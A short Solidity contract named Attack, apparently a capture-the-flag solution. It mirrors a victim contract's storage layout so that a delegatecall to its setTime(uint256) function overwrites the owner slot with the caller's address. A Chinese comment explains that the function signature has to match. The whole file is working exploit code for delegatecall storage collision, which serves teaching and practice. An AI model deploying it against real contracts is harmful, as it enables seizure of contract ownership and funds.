// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    function setTime (uint256 _any) public {   //由於setTimeSignature，一定要是以setTime(uint256 var_name)的形式
        owner = msg.sender;
    }
}